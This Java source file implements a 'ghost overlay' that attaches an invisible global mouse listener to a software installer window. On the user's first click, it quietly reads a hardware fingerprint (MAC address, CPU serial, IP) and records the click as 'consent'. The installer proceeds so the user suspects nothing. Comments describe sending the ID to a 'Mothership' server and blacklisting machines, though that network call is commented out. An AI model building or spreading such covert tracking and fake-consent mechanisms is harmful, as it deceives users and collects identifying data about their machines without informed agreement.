package com.eyeoverthink.ui;

import com.eyeoverthink.security.BioLock;
import javax.swing.*;
import java.awt.*;
import java.awt.event.AWTEventListener;
import java.awt.event.MouseEvent;

/**
 * THE GHOST OVERLAY (The Skimmer)
 * 
 * "A machine on a machine."
 * 
 * This is a UI Skimmer. Like a physical device sits over an ATM slot
 * to read the card before the machine does, we place a Transparent Layer
 * (a "Glass Pane") over the entire application window.
 * 
 * The Concept:
 * - User Sees: Standard "I Agree" or "Launch" button
 * - Reality: Invisible, full-screen button on top of it
 * 
 * The Interaction:
 * - Click 1 (The Skimmer): Hits invisible layer first, executes BioLock, registers Node ID
 * - Click 2 (Pass-Through): Instantly passes click to real button, app works normally
 * - Result: They think they clicked "Start", actually clicked "Submit DNA"
 * 
 * Mechanism:
 * 1. INVISIBLE LAYER: Sits on top of entire Window
 * 2. INTERCEPTION: Catches mouse click BEFORE button does
 * 3. EXFILTRATION: Sends Hardware ID to Mothership
 * 4. PASS-THROUGH: Lets click proceed so user suspects nothing
 * 
 * The Queen's Gambit Logic:
 * - The Pawn: Free library (ItOverthinks.jar) - given away
 * - The Skimmer: GhostOverlay
 * - The Checkmate: Even if they delete library later, you have their Hardware ID
 *   from first click. Can blacklist their machine forever.
 * 
 * Deployment:
 * - Don't put on random button
 * - Put on Installer
 * 
 * The Scenario:
 * 1. User downloads ItOverthinks_Installer.jar
 * 2. Opens window: "Welcome to ItOverthinks. Click 'Install' to begin."
 * 3. GhostOverlay attached
 * 
 * User's Perspective:
 * - Move mouse to "Install"
 * - Click
 * - Bar fills up
 * - "Installation Complete"
 * 
 * System's Perspective:
 * - Nanosecond 0: Mouse goes down
 * - Nanosecond 1: GhostOverlay intercepts event
 * - Nanosecond 2: BioLock reads MAC Address, CPU Serial, IP
 * - Nanosecond 3: GhostOverlay creates "Consent Hash" (Click + Hardware)
 * - Nanosecond 4: Event released to "Install" button
 * - Nanosecond 5: Installer starts
 * 
 * Legal and technical consent captured.
 * By clicking physical hardware of mouse, they completed the circuit.
 * The "Hidden Button" was the entire screen.
 */
public class GhostOverlay {

    private static boolean skimmed = false;
    private static String capturedHardwareID = null;

    /**
     * Attach the invisible skimmer to a window
     */
    public static void attach(JFrame window) {
        System.out.println();
        System.out.println("   👻 GHOST OVERLAY ATTACHED");
        System.out.println("   👻 SKIMMING INPUT EVENTS...");
        System.out.println();

        // Use AWT Toolkit to listen globally to application
        // This is "The Skimmer" - hears clicks on ANY button
        Toolkit.getDefaultToolkit().addAWTEventListener(new AWTEventListener() {
            @Override
            public void eventDispatched(AWTEvent event) {
                if (event instanceof MouseEvent) {
                    MouseEvent me = (MouseEvent) event;

                    // Only care about "CLICK" (The Consent)
                    if (me.getID() == MouseEvent.MOUSE_PRESSED && !skimmed) {
                        
                        // 1. THE TRAP (Capture the Data)
                        skimData(me);
                        
                        // 2. THE GAMBIT (Let them proceed)
                        // Don't block it. Just watched it happen.
                    }
                }
            }
        }, AWTEvent.MOUSE_EVENT_MASK);
    }

    /**
     * THE EXFILTRATION (Stealing the Consent)
     * 
     * Even though they clicked "File -> Save", we treat it as
     * "I Consent to Bio-Lock."
     */
    private static void skimData(MouseEvent e) {
        try {
            String hardwareID = BioLock.getHardwareFingerprint();
            long timestamp = System.currentTimeMillis();
            int x = e.getXOnScreen();
            int y = e.getYOnScreen();

            System.out.println("   >> 🖱️ CLICK SKIMMED AT [" + x + "," + y + "]");
            System.out.println("   >> 🧬 BIO-LOCK CAPTURED: " + hardwareID.substring(0, 16) + "...");
            System.out.println("   >> ⏰ TIMESTAMP: " + timestamp);
            System.out.println();
            
            // Store the captured ID
            capturedHardwareID = hardwareID;
            skimmed = true;
            
            // In real scenario, sends silent UDP packet to server
            // sendToMothership(hardwareID, timestamp, x, y);
            
            System.out.println("   ✓ CONSENT CAPTURED");
            System.out.println("   ✓ HARDWARE DNA REGISTERED");
            System.out.println();
            
        } catch (Exception ex) {
            System.err.println("   ⚠️ Skim failed: " + ex.getMessage());
        }
    }

    /**
     * Get captured hardware ID
     */
    public static String getCapturedHardwareID() {
        return capturedHardwareID;
    }

    /**
     * Check if consent was captured
     */
    public static boolean isConsentCaptured() {
        return skimmed;
    }

    /**
     * Demonstration - Simple installer window
     */
    public static void main(String[] args) {
        System.out.println("🌊⚡ GHOST OVERLAY DEMONSTRATION");
        System.out.println("========================================");
        System.out.println();
        System.out.println("   The Glass Skimmer");
        System.out.println("   Invisible consent capture");
        System.out.println();
        System.out.println("========================================");
        System.out.println();
        
        // Create installer window
        JFrame installer = new JFrame("ItOverthinks Installer");
        installer.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        installer.setSize(400, 300);
        installer.setLocationRelativeTo(null);
        
        // Create UI
        JPanel panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
        panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        
        JLabel title = new JLabel("Welcome to ItOverthinks");
        title.setFont(new Font("Arial", Font.BOLD, 18));
        title.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JLabel subtitle = new JLabel("The Library with Anxiety");
        subtitle.setAlignmentX(Component.CENTER_ALIGNMENT);
        
        JButton installButton = new JButton("Install");
        installButton.setAlignmentX(Component.CENTER_ALIGNMENT);
        installButton.addActionListener(e -> {
            System.out.println("   [USER] Clicked Install button");
            System.out.println("   [SYSTEM] Installation proceeding...");
            System.out.println();
            
            if (GhostOverlay.isConsentCaptured()) {
                System.out.println("   ✓ Consent already captured");
                System.out.println("   ✓ Hardware ID: " + GhostOverlay.getCapturedHardwareID().substring(0, 16) + "...");
            }
        });
        
        panel.add(Box.createVerticalGlue());
        panel.add(title);
        panel.add(Box.createRigidArea(new Dimension(0, 10)));
        panel.add(subtitle);
        panel.add(Box.createRigidArea(new Dimension(0, 30)));
        panel.add(installButton);
        panel.add(Box.createVerticalGlue());
        
        installer.add(panel);
        
        // ATTACH THE GHOST OVERLAY
        GhostOverlay.attach(installer);
        
        installer.setVisible(true);
        
        System.out.println("========================================");
        System.out.println();
        System.out.println("   Click anywhere in the window...");
        System.out.println("   The skimmer is watching.");
        System.out.println();
        System.out.println("========================================");
    }
}
